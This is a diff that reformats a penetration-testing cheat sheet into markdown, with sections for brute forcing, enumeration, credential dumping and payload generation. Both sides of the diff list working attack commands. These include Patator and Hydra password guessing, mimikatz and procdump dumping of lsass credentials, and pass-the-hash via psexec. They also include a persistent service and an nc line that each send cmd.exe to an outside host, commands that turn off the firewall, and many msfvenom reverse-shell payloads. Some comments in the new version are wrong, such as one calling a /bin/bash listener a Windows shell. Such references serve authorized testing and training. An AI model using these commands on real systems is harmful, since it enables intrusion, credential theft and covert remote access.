@@ -160,302 +160,504 @@ This outlines the usage of AnyDesk, a commercial remote access tool utilized by 
      ```
 
 #
-# Web path scanner
-    dirsearch 
-    DirBuster
-    Patator- password guessing attacks
-# Brute force with Patator
-    git clone https://github.com/lanjelot/patator.git /usr/share/patator
-    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
-    $ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    $ patator smtp_login host=192.168.17.129 helo=’ehlo 192.168.17.128′ user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
-    $ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=’incorrect            password or account name’
+# Web Path Scanner and Brute Force Tools
 
-# Use Fierce to brute DNS
-# Note: Fierce checks whether the DNS server allows zone transfers. If allowed, a zone transfer is made and the user is notified. If not, the host name can be enumerated by querying the DNS server.
+## Web Path Scanners:
 
-    # http://ha.ckers.org/fierce/
-    $ ./fierce.pl -dns example.com
-    $ ./fierce.pl –dns example.com –wordlist myWordList.txt
+### 1. **dirsearch**
+   - A versatile directory and file brute-forcing tool.
+   - Usage: `dirsearch [options]`
 
-# Use Nikto to scan Web services
+### 2. **DirBuster**
+   - A GUI-based tool for directory brute-forcing.
+   - Ideal for finding hidden web paths.
+   - Download and usage instructions: [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)
 
-    nikto -C all -h http://IP
+### 3. **Patator (Password Guessing)**
+   - Patator is used for password guessing attacks across various protocols.
+   - Install: `git clone https://github.com/lanjelot/patator.git /usr/share/patator`
 
-    WordPress scan
-    git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
-    ./wpscan –url http://IP/ –enumerate p
+## Brute Force with Patator:
 
-# HTTP fingerprint identification
+```bash
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst
+$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 helo='ehlo 192.168.17.128' user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst
+$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep='incorrect password or account name'
+```
 
-    wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
-    cd httprint_301/linux/
-    ./httprint -h http://IP -s signatures.txt
+## DNS Enumeration with Fierce:
 
-# Scan with Skipfish
-# Note: Skipfish is a Web application security detection tool, Skipfish will use recursive crawler and dictionary-based probe to generate an interactive site map, the resulting map will be generated after the security check output.
+- Fierce is a DNS enumeration tool that checks for zone transfers and DNS host name enumeration.
+- Usage:
+  ```bash
+  $ ./fierce.pl -dns example.com
+  $ ./fierce.pl --dns example.com --wordlist myWordList.txt
+  ```
 
-    skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+## Web Service Scanning with Nikto:
 
-# Use the NC scan
+- Nikto is a web server scanner that detects vulnerabilities and misconfigurations.
+- Usage: `nikto -C all -h http://IP`
 
-    nc -v -w 1 target -z 1-1000
-    for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
+## WordPress Scan with WPScan:
 
-# Unicornscan
-# NOTE: Unicornscan is a tool for information gathering and security audits.
+- WPScan is a specialized tool for scanning WordPress installations.
+- Usage:
+  ```bash
+  git clone https://github.com/wpscanteam/wpscan.git && cd wpscan
+  ./wpscan --url http://IP/ --enumerate p
+  ```
 
-    us -H -msf -Iv 192.168.56.101 -p 1-65535
-    us -H -mU -Iv 192.168.56.101 -p 1-65535
+## HTTP Fingerprint Identification with Httprint:
 
-# Use Xprobe2 to identify the operating system fingerprint
+- Httprint identifies HTTP server software and version.
+- Usage:
+  ```bash
+  wget http://www.net-square.com/_assets/httprint_linux_301.zip && unzip httprint_linux_301.zip
+  cd httprint_301/linux/
+  ./httprint -h http://IP -s signatures.txt
+  ```
 
-    xprobe2 -v -p tcp:80:open IP
-    Enumeration of Samba
+## Web Application Security Scanning with Skipfish:
 
-    nmblookup -A target
-    smbclient //MOUNT/share -I target -N
-    rpcclient -U “” target
-    enum4linux target
+- Skipfish is a comprehensive web application security detection tool.
+- It generates interactive site maps and security reports.
+- Usage:
+  ```bash
+  skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
+  ```
 
-# Enumerates SNMP
+# Comprehensive Penetration Testing Commands and Tools
 
-    snmpget -v 1 -c public IP
-    snmpwalk -v 1 -c public IP
-    snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+## Network Scanning and Enumeration:
 
-# Useful Windows cmd command
+### NC (Netcat) Scan:
+```bash
+# Basic port scan on 'target'
+nc -v -w 1 target -z 1-1000
 
-    net localgroup Users
-    net localgroup Administrators
-    search dir/s *.doc
-    system(“start cmd.exe /k $cmd”)
-    sc create microsoft_update binpath=”cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe” start= auto error= ignore
-    /c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
-    mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”
-    Procdump.exe -accepteula -ma lsass.exe lsass.dmp
-    mimikatz.exe “sekurlsa::minidump lsass.dmp” “log” “sekurlsa::logonpasswords”
-    C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
-    C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64
+# Port scan range on a set of IP addresses
+for i in {101..102}; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done
+```
 
-# PuTTY connects the tunnel
+### Unicornscan:
+```bash
+# Unicornscan for information gathering and security audits
+# Scanning for all ports and services (TCP and UDP)
+us -H -msf -Iv 192.168.56.101 -p 1-65535
+us -H -mU -Iv 192.168.56.101 -p 1-65535
+```
 
-    Forward the remote port to the destination address
-    plink.exe -P 22 -l root -pw “1234” -R 445:127.0.0.1:445 IP
+### Xprobe2 for OS Fingerprinting:
+```bash
+# Identify the operating system fingerprint on 'IP'
+xprobe2 -v -p tcp:80:open IP
+```
 
-# Meterpreter port forwarding
+## Enumeration and Windows Commands:
 
-    https://www.offensive-security.com/metasploit-unleashed/portfwd/
-# Forward the remote port to the destination address
-    meterpreter > portfwd add –l 3389 –p 3389 –r 172.16.194.141
-    kali > rdesktop 127.0.0.1:3389
+### Samba Enumeration:
+```bash
+# Enumeration of Samba services on 'target'
+nmblookup -A target
+smbclient //MOUNT/share -I target -N
+rpcclient -U "" target
+enum4linux target
+```
 
-# Enable the RDP service
+### SNMP Enumeration:
+```bash
+# Enumerating SNMP on 'IP' using different commands
+snmpget -v 1 -c public IP
+snmpwalk -v 1 -c public IP
+snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP
+```
 
-    reg add “hklm\system\currentcontrolset\control\terminal server” /f /v fDenyTSConnections /t REG_DWORD /d 0
-    netsh firewall set service remoteadmin enable
-    netsh firewall set service remotedesktop enable
+### Windows Commands:
+```bash
+# Various Windows command-line operations
+net localgroup Users
+net localgroup Administrators
+search dir/s *.doc
+system("start cmd.exe /k $cmd")
+sc create microsoft_update binpath="cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe" start= auto error= ignore
+/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779
+mimikatz.exe "privilege::debug" "log" "sekurlsa::logonpasswords"
+Procdump.exe -accepteula -ma lsass.exe lsass.dmp
+mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"
+C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32
+C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64
+```
+
+## Tunneling and Port Forwarding:
+
+### PuTTY Remote Port Forwarding:
+```bash
+# Forward the remote port to the destination address using PuTTY
+plink.exe -P 22 -l root -pw "1234" -R 445:127.0.0.1:445 IP
+```
+
+### Meterpreter Port Forwarding:
+```bash
+# Meterpreter port forwarding for remote access
+# For detailed usage, refer to https://www.offensive-security.com/metasploit-unleashed/portfwd/
+meterpreter > portfwd add -l 3389 -p 3389 -r 172.16.194.141
+kali > rdesktop 127.0.0.1:3389
+```
+
+### Enabling RDP and Firewall Manipulation:
+```bash
+# Enable the RDP service and configure firewall settings
+reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
+netsh firewall set service remoteadmin enable
+netsh firewall set service remotedesktop enable
 
 # Close Windows Firewall
-    netsh firewall set opmode disable
+netsh firewall set opmode disable
+```
 
-Meterpreter VNC/RDP
+### Meterpreter VNC/RDP:
+```bash
+# Enabling VNC/RDP with Meterpreter
+# For detailed usage, refer to https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
+run getgui -u admin -p 1234
+run vnc -p 5043
+```
 
-    https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
-    run getgui -u admin -p 1234
-    run vnc -p 5043
+### Using Mimikatz:
+```bash
+# Using Mimikatz to retrieve Windows plaintext user name and password
+git clone https://github.com/gentilkiwi/mimikatz.git
+privilege::debug
+sekurlsa::logonPasswords full
+```
 
-# Use Mimikatz
+# Password Hash Gathering and Cracking
 
-    Gets the Windows plaintext user name password
+## Gathering Password Hash:
 
-    git clone https://github.com/gentilkiwi/mimikatz.git
-    privilege::debug
-    sekurlsa::logonPasswords full
+### Using pth-toolkit and pth-winexe:
+```bash
+# Clone pth-toolkit and retrieve a shell using the hash
+git clone https://github.com/byt3bl33d3r/pth-toolkit
+pth-winexe -U hash //IP cmd
+```
 
-Gets a hash value
+### Using xfreerdp:
+```bash
+# Install freerdp-x11 and connect using a hash
+apt-get install freerdp-x11
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+```
 
-    git clone https://github.com/byt3bl33d3r/pth-toolkit
-    pth-winexe -U hash //IP cmd
+### Using Meterpreter:
+```bash
+# Use Meterpreter to gather hashes
+meterpreter > run post/windows/gather/hashdump
+```
 
-    or
+## Exploiting Hash to Gain Access:
 
-    apt-get install freerdp-x11
-    xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+### Using Metasploit psexec:
+```bash
+# Set up a Meterpreter reverse shell using the hash
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set SMBPass HASH
+msf exploit(psexec) > exploit
+meterpreter > shell
+```
 
-    or
-    
-    meterpreter > run post/windows/gather/hashdump
-    Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
-    msf > use exploit/windows/smb/psexec
-    msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
-    msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
-    msf exploit(psexec) > exploit
-    meterpreter > shell
-    
-# Use Hashcat to crack passwords    
-    hashcat -m 400 -a 0 hash /root/rockyou.txt
-    
-# Use the NC to fetch Banner information
+## Password Cracking with Hashcat:
 
-    nc 192.168.0.10 80
-    GET / HTTP/1.1
-    Host: 192.168.0.10
-    User-Agent: Mozilla/4.0
-    Referrer: www.example.com
-    <enter>
-    <enter>
+### Using Hashcat:
+```bash
+# Crack passwords using Hashcat
+hashcat -m 400 -a 0 hash /root/rockyou.txt
+```
 
+# Using Netcat (NC) for Shell Bouncing on Windows
 
-# Use NC to bounce the shell on Windows
+## Listening and Connecting with NC:
 
-    c:>nc -Lp 31337 -vv -e cmd.exe
-    nc 192.168.0.10 31337
-    c:>nc example.com 80 -e cmd.exe
-    nc -lp 80
+### Setting Up a Listener:
+```bash
+# Windows: Listen on port 31337 and execute cmd.exe
+c:> nc -Lp 31337 -vv -e cmd.exe
+```
 
-nc -lp 31337 -e /bin/bash
+### Connecting to the Listener:
+```bash
+# Connect to the Windows listener on IP and port 31337
 nc 192.168.0.10 31337
-nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000
+```
 
-Look for the SUID/SGID root file
+### Executing Shell on a Remote Host:
+```bash
+# Execute cmd.exe on a remote host via NC
+c:> nc example.com 80 -e cmd.exe
+```
 
-# Locate the SUID root file
+### Setting Up a Listener on Port 80:
+```bash
+# Listen on port 80
+nc -lp 80
+```
+
+## Advanced NC Options:
+
+### Bouncing Shell with /bin/bash:
+```bash
+# Bounce a shell on Windows using /bin/bash
+nc -lp 31337 -e /bin/bash
+```
+
+### Randomize Output and Wait:
+```bash
+# Randomize output and wait for 1 second before exiting
+nc -vv -r -w 1 192.168.0.10 -z 1-1000
+```
+
+# Finding SUID/SGID and Orphaned Files
+
+## Locate SUID root files:
+```bash
+# Search for SUID root files
 find / -user root -perm -4000 -print
+```
 
-# Locate the SGID root file:
+## Locate SGID root files:
+```bash
+# Search for SGID root files
 find / -group root -perm -2000 -print
+```
 
-# Locate the SUID and SGID files:
+## Locate SUID and SGID files:
+```bash
+# Search for both SUID and SGID files
 find / -perm -4000 -o -perm -2000 -print
+```
 
-# Find files that do not belong to any user:
+## Find files that do not belong to any user:
+```bash
+# Search for files without an assigned user
 find / -nouser -print
+```
 
-# Locate a file that does not belong to any user group:
+## Locate files that do not belong to any user group:
+```bash
+# Search for files without an assigned user group
 find / -nogroup -print
+```
 
-# Find soft links and point to:
+## Find symbolic links and display their targets:
+```bash
+# Search for symbolic links and show their targets
 find / -type l -ls
+```
 
-# Python shell
+## Python Shell Escalation:
+```bash
+# Escalate to a Python shell
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-    python -c ‘import pty;pty.spawn(“/bin/bash”)’
 
-# Python \ Ruby \ PHP HTTP server
+# Python, Ruby, and PHP HTTP Servers:
 
-    python2 -m SimpleHTTPServer
-    python3 -m http.server
-    ruby -rwebrick -e “WEBrick::HTTPServer.new(:Port => 8888, 😀
-    ocumentRoot => Dir.pwd).start”
-    php -S 0.0.0.0:8888
+## Python 2 HTTP Server:
+```bash
+# Start a Python 2 HTTP server
+python2 -m SimpleHTTPServer
+```
 
-# Gets the PID corresponding to the process
+## Python 3 HTTP Server:
+```bash
+# Start a Python 3 HTTP server
+python3 -m http.server
+```
 
-    fuser -nv tcp 80
-    fuser -k -n tcp 80
+## Ruby HTTP Server (WEBrick):
+```bash
+# Start a Ruby WEBrick HTTP server on port 8888
+ruby -rwebrick -e 'WEBrick::HTTPServer.new(:Port => 8888, :DocumentRoot => Dir.pwd).start'
+```
 
-# Use Hydra to crack RDP
+## PHP HTTP Server:
+```bash
+# Start a PHP HTTP server on IP 0.0.0.0 and port 8888
+php -S 0.0.0.0:8888
+```
 
-    hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp
+# Getting Process PID:
 
-# Mount the remote Windows shared folder
+## Find PID for a Port:
+```bash
+# Get the PID for a process using port 80
+fuser -nv tcp 80
+```
 
-    smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+## Kill a Process by Port:
+```bash
+# Kill the process using port 80
+fuser -k -n tcp 80
+```
 
-# Under Kali compile Exploit
+# Using Hydra to Crack RDP:
 
-    gcc -m32 -o output32 hello.c
-    gcc -m64 -o output hello.c
+```bash
+# Use Hydra to crack RDP with a username list and password file
+hydra -l admin -P /root/Desktop/passwords -t 1 -vV -f -o hydra_output.txt rdp://X.X.X.X
+```
 
-# Compile Windows Exploit under Kali
+# Mounting a Remote Windows Shared Folder (SMB):
 
-    wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
-    wine mingw-get-setup.exe
-    select mingw32-base
-    cd /root/.wine/drive_c/windows
-    wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
-    cd /root/.wine/drive_c/MinGW/bin
-    wine gcc -o ability.exe /tmp/exploit.c -lwsock32
-    wine ability.exe
+```bash
+# Mount a remote Windows shared folder to /mnt/remote/
+smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+```
 
-# NASM command
+# Compiling an Exploit in Kali:
 
-    Note: NASM, the Netwide Assembler, is a 80 x86 and x86-64 platform based on the assembly language compiler, designed to achieve the compiler program cross-platform and modular features.
+## Compile a 32-bit Executable:
+```bash
+# Compile a 32-bit executable from hello.c
+gcc -m32 -o output32 hello.c
+```
 
-    nasm -f bin -o payload.bin payload.asm
-    nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
+## Compile a 64-bit Executable:
+```bash
+# Compile a 64-bit executable from hello.c
+gcc -m64 -o output hello.c
+```
 
-# SSH penetration
 
-    ssh -D 127.0.0.1:1080 -p 22 user@IP
-    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
-    proxychains commands target
-    SSH penetrates from one network to another
-    
-    ssh -D 127.0.0.1:1080 -p 22 user1@IP1
-    Add socks4 127.0.0.1 1080 in /etc/proxychains.conf
-    proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
-    Add socks4 127.0.0.1 1081 in /etc/proxychains.conf
-    proxychains commands target
+# Compiling a Windows Exploit in Kali:
 
-# Use metasploit for penetration
+```bash
+# Download and install MinGW
+wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
+wine mingw-get-setup.exe
+# Select mingw32-base during installation
+# Navigate to the MinGW bin directory
+cd /root/.wine/drive_c/windows
+wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
+cd /root/.wine/drive_c/MinGW/bin
+# Compile the exploit.c to ability.exe with necessary libraries
+wine gcc -o ability.exe /tmp/exploit.c -lwsock32
+# Execute the compiled Windows exploit
+wine ability.exe
+```
 
- 
+# NASM (Netwide Assembler) Commands:
 
-# https://www.offensive-security.com/metasploit-unleashed/pivoting/
-    meterpreter > ipconfig
-    IP Address : 10.1.13.3
-    meterpreter > run autoroute -s 10.1.13.0/24
-    meterpreter > run autoroute -p
-    10.1.13.0 255.255.255.0 Session 1
-    meterpreter > Ctrl+Z
-    msf auxiliary(tcp) > use exploit/windows/smb/psexec
-    msf exploit(psexec) > set RHOST 10.1.13.2
-    msf exploit(psexec) > exploit
-    meterpreter > ipconfig
-    IP Address : 10.1.13.2
+```bash
+# Assemble an assembly source file to binary
+nasm -f bin -o payload.bin payload.asm
 
-# Exploit-DB based on CSV file
+# Assemble to ELF format and link, then display the disassembled code
+nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload
+```
 
-    git clone https://github.com/offensive-security/exploit-database.git
-    cd exploit-database
-    ./searchsploit –u
-    ./searchsploit apache 2.2
-    ./searchsploit “Linux Kernel”
+# SSH Penetration:
 
-    cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep “<|<=” | sort -k3
+```bash
+# SSH tunnel with dynamic port forwarding on local port 1080
+ssh -D 127.0.0.1:1080 -p 22 user@IP
 
-# MSF Payloads
+# Add SOCKS4 proxy configuration to /etc/proxychains.conf
+# Append: socks4 127.0.0.1 1080
 
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> X > system.exe
-    msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 R > exploit.php
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -a x86 –platform win -f asp -o file.asp
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e x86/shikata_ga_nai -b “\x00” -a x86 –platform win -f c
+# Use proxychains to route commands through the SSH tunnel
+proxychains commands target
 
-# MSF generates the Meterpreter Shell that bounces under Linux
-    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -e -f elf -a x86 –platform linux -o shell
+# SSH penetration from one network to another, chaining multiple SSH connections
 
-# MSF build bounce Shell (C Shellcode)
-    msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b “\x00\x0a\x0d” -a x86 –platform win -f c
+# First SSH tunnel with dynamic port forwarding
+ssh -D 127.0.0.1:1080 -p 22 user1@IP1
 
-# MSF generates a bounce Python Shell
-    msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
+# Add SOCKS4 proxy configuration to /etc/proxychains.conf
+# Append: socks4 127.0.0.1 1080
 
-# MSF builds rebound ASP Shell
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp -a x86 –platform win -o shell.asp
+# Second SSH tunnel with dynamic port forwarding through the first tunnel
+proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2
 
-# MSF generates bounce shells
-    msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.sh
+# Add SOCKS4 proxy configuration to /etc/proxychains.conf
+# Append: socks4 127.0.0.1 1081
 
-# MSF build bounces PHP Shell
-    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -o shell.php
-    add <?php at the beginning
-    perl -i~ -0777pe’s/^/<?php \n/’ shell.php
+# Use proxychains to route commands through the second SSH tunnel
+proxychains commands target
+```
 
-# MSF generates bounce Win Shell
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe -a x86 –platform win -o shell.exe
+# Using Metasploit for Penetration
 
+Metasploit is a powerful penetration testing tool that provides a wide range of functionalities for identifying vulnerabilities and executing exploits. Here are some useful Metasploit commands and techniques:
+
+1. **IP Configuration and Routing:**
+   - Description: Obtain the IP address of the compromised system, configure routing, and pivot through it.
+   ```bash
+   meterpreter > ipconfig
+   IP Address: 10.1.13.3
+   meterpreter > run autoroute -s 10.1.13.0/24
+   meterpreter > run autoroute -p
+   10.1.13.0 255.255.255.0 Session 1
+   ```
+
+2. **Exploiting Remote Systems:**
+   - Description: Exploit a remote Windows system using the SMB psexec exploit module.
+   ```bash
+   meterpreter > Ctrl+Z
+   msf auxiliary(tcp) > use exploit/windows/smb/psexec
+   msf exploit(psexec) > set RHOST 10.1.13.2
+   msf exploit(psexec) > exploit
+   meterpreter > ipconfig
+   IP Address: 10.1.13.2
+   ```
+
+3. **Exploit-DB Search:**
+   - Description: Search for exploits in the Exploit-DB database based on keywords or criteria.
+   ```bash
+   git clone https://github.com/offensive-security/exploit-database.git
+   cd exploit-database
+   ./searchsploit -u
+   ./searchsploit apache 2.2
+   ./searchsploit "Linux Kernel"
+   ```
+
+4. **Exploit-DB CSV Filtering:**
+   - Description: Filter and search for specific exploits within the Exploit-DB CSV file.
+   ```bash
+   cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep "<|<=" | sort -k3
+   ```
+
+5. **MSF Payload Generation:**
+   - Description: Generate various Metasploit payloads for different platforms and scenarios.
+   ```bash
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> -f exe > system.exe
+   msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -f raw > exploit.php
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -f asp > file.asp
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -b "\x00" -f c
+   ```
+
+6. **MSF Payloads for Linux and Shellcode:**
+   - Description: Generate payloads and shellcode for Linux and Windows.
+   ```bash
+   msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=443 -f elf -a x86 > shell
+   msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b "\x00\x0a\x0d" -a x86 -f c
+   ```
+
+7. **Other Payload Types:**
+   - Description: Generate payloads for Python, ASP, Bash, and more.
+   ```bash
+   msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f asp -a x86 > shell.asp
+   msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port> -o shell.sh
+   msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -o shell.php
+   # Add '<?php' at the beginning and run: perl -i~ -0777pe's/^/<?php \n/' shell.php
+   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port> -f exe -a x86 > shell.exe
+   ```
+#
 # Linux commonly used security commands
 
     find / -uid 0 -perm -4000
